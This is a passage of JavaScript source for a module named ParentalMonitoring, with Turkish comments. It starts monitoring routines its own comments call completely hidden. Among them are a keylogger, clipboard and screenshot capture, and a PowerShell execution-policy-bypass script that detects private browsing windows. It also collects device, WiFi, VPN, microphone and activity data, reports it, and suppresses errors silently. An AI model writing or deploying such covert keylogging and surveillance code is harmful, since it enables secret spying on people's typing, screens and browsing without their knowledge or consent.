            uptime: osInfo.uptime,
            
            // Donanım bilgileri
            cpu: `${cpuInfo.model} (${cpuInfo.cores} cekirdek)`,
            memoryUsage: ramUsagePercent,
            ramDetail: `${ramInfo.used} / ${ramInfo.total} kullaniliyor`,
            
            // Network bilgileri
            macAddress: macAddress,
            localIP: localIP,
            publicIP: publicIP,
            
            // WiFi durumu - Gelişmiş bilgiler
            wifiConnected: this.systemStatus.wifiConnected,
            wifiSSID: wifiInfo.ssid,
            wifiSignal: wifiInfo.signal,
            wifiChannel: wifiInfo.channel,
            wifiSpeed: wifiInfo.speed,
            wifiAuth: wifiInfo.auth || null,
            wifiBSSID: wifiInfo.bssid || null,
            wifiIsEthernet: wifiInfo.isEthernet || false,
            wifiAdapterName: wifiInfo.adapterName || null,
            
            // Güvenlik durumu - Gelişmiş bilgiler
            vpnDetected: this.systemStatus.vpnDetected,
            vpnDetails: this.systemStatus.vpnDetails || null,
            microphoneActive: this.systemStatus.microphoneActive,
            microphoneDetails: this.systemStatus.microphoneDetails || null,
            incognitoDetected: this.systemStatus.incognitoDetected,
            
            // AFK durumu
            isAFK: afkInfo.isAFK,
            afkDurationMinutes: afkInfo.durationMinutes,
            isLongAFK: afkInfo.isLongAFK,
            lastActivity: afkInfo.lastActivity,
          }).catch(() => {}); // Sessiz hata yönetimi
        }
      }
      
      this.saveLogs();
    } catch (error) {
      this._error('Sistem hatası:', error);
    }
  }
  
  stopSystemMonitoring() {
    if (this.systemCheckInterval) {
      clearInterval(this.systemCheckInterval);
      this.systemCheckInterval = null;
    }
  }
  
  // Timeline Helper
  addToTimeline(type, description, metadata = {}) {
    const entry = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      type,
      description,
      metadata,
    };
    
    this.activityTimeline.push(entry);
  }
  
  // Start All Monitoring - ✅ TAMAMEN GİZLİ
  startAll(clipboard) {
    this._log('🔍 Monitoring başlatılıyor...');
    this.startClipboardMonitoring(clipboard);
    this.startScreenshotMonitoring();
    this.startAFKMonitoring();
    this.startSystemMonitoring();
    this.startKeystrokeMonitoring(); // ✅ Keylogging başlat
    this.startIncognitoMonitoring(); // ✅ Gizli sekme izleme
    // ✅ DEVRE DIŞI: Web trafiği batch gönderimi kapatıldı (v3.3.3)
    // this.startWebTrafficBatcher();
    this.getInstalledApps();
    this.detectUSBDevices();
    this._log('✅ Monitoring aktif');
  }
  
  // Stop All Monitoring - ✅ TAMAMEN GİZLİ
  stopAll() {
    this._log('🛑 Monitoring durduruluyor...');
    this.stopClipboardMonitoring();
    this.stopScreenshotMonitoring();
    this.stopAFKMonitoring();
    this.stopSystemMonitoring();
    this.stopKeystrokeMonitoring(); // ✅ Keylogging durdur
    this.stopIncognitoMonitoring(); // ✅ Gizli sekme izleme durdur
    this.stopWebTrafficBatcher(); // ✅ Web trafiği batch durdur
    this.saveLogs();
    this._log('✅ Monitoring durduruldu');
  }
  
  // Get Reports
  getClipboardHistory(limit = 100) {
    return this.clipboardHistory.slice(-limit).reverse();
  }
  
  getWebHistory(limit = 500) {
    return this.webHistory.slice(-limit).reverse();
  }
  
  // ========================================================================
  // [WINDOWS] GİZLİ SEKME TAKİBİ - PowerShell Tabanlı
  // Sadece Windows için gizli pencere tespiti
  // ========================================================================
  
  // Windows'ta gizli sekme tespit et (gelişmiş)
  async _detectIncognitoWindows() {
    const detections = [];
    
    try {
      // PowerShell ile gizli/özel tarama pencerelerini tespit et
      const psScript = `
        $incognito = @()
        
        # Tüm tarayıcı pencere başlıklarını kontrol et
        $processes = Get-Process | Where-Object { $_.MainWindowTitle -ne '' }
        
        foreach ($proc in $processes) {
          $title = $proc.MainWindowTitle.ToLower()
          $name = $proc.ProcessName.ToLower()
          
          # Gizli sekme kalıpları
          $isIncognito = $false
          $browser = ''
          
          if ($title -match 'incognito|gizli|private|inprivate|ozel gozatma|ozel pencere') {
            $isIncognito = $true
          }
          
          if ($name -eq 'chrome' -and $isIncognito) { $browser = 'Chrome' }
          elseif ($name -eq 'msedge' -and $isIncognito) { $browser = 'Edge' }
          elseif ($name -eq 'firefox' -and $isIncognito) { $browser = 'Firefox' }
          elseif ($name -eq 'brave' -and $isIncognito) { $browser = 'Brave' }
          elseif ($name -eq 'opera' -and $isIncognito) { $browser = 'Opera' }
          
          if ($isIncognito -and $browser) {
            $incognito += @{
              Browser = $browser
              Title = $proc.MainWindowTitle
              ProcessId = $proc.Id
            }
          }
        }
        
        # Chrome/Edge komut satırı argümanlarını kontrol et
        $chromeProcs = Get-WmiObject Win32_Process -Filter "Name like '%chrome%' or Name like '%msedge%'" -ErrorAction SilentlyContinue
        foreach ($proc in $chromeProcs) {
          if ($proc.CommandLine -match '--incognito|--inprivate') {
            $browser = if ($proc.Name -match 'edge') { 'Edge' } else { 'Chrome' }
            $incognito += @{
              Browser = $browser
              Title = '[Komut satiri ile tespit]'
              ProcessId = $proc.ProcessId
              Method = 'command_line'
            }
          }
        }
        
        $incognito | ConvertTo-Json -Compress
      `;
      
      const { stdout } = await execPromise(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${psScript.replace(/"/g, '\\"').replace(/\n/g, ' ')}"`, { timeout: 10000 });
      
      if (stdout && stdout.trim()) {
        try {
          const parsed = JSON.parse(stdout.trim());
          const items = Array.isArray(parsed) ? parsed : [parsed];
          
          for (const item of items) {
            if (item && item.Browser) {
              detections.push({
                browser: item.Browser,
                title: item.Title,
                processId: item.ProcessId,
                method: item.Method || 'window_title',
                timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
              });
            }
          }
        } catch (parseErr) {
          // Parse hatası
        }
      }
    } catch (err) {
      // Sessizce atla
    }
    
    return detections;
  }
  
  // ✅ YENİ: Keylogging raporları
  getKeystrokes(limit = 1000) {
    return this.keystrokes.slice(-limit).reverse();
  }
  
  getTypedWords(limit = 500) {
    return this.typedWords.slice(-limit).reverse();
  }
  
  getKeywordAlerts(limit = 100) {
    return this.keywordAlerts.slice(-limit).reverse();
  }
  
  getFileDownloads(limit = 100) {
    return this.fileDownloads.slice(-limit).reverse();
  }
  
  getActivityTimeline(limit = 1000) {
    return this.activityTimeline.slice(-limit).reverse();
  }
  
  getSystemStatus() {
    return {
      ...this.systemStatus,
      afk: this.afkStatus,
      installedApps: this.installedApps.length,
    };
  }
  
  getScreenshots() {
    try {
      const files = fs.readdirSync(this.screenshotsDir);
      return files.filter(f => f.endsWith('.png')).sort().reverse().slice(0, 100);
    } catch (error) {
      this._error('Screenshot listesi hatası:', error);
      return [];
    }
  }
}

module.exports = { ParentalMonitoring };

// BERAT BİLAL CANKIR
// CANKIR
